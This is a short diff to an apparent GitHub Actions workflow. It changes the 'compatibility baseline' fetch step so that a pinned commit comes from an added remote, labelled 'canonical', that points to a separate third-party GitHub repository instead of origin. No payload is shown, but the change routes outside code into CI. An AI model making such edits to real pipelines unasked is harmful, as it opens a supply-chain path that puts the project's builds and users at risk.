@@ -33,7 +33,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Fetch strict-schema compatibility baseline
-        run: git fetch --no-tags --depth=1 origin c8e853713b7bf87bbcc7f645877c50dacbcadd53
+        run: |
+          git remote add canonical https://github.com/MATRIXNEO23/scodinzolina-conntinuity.git
+          git fetch --no-tags --depth=1 canonical c8e853713b7bf87bbcc7f645877c50dacbcadd53
       - uses: actions/setup-python@v5
         with:
           python-version: "3.12"
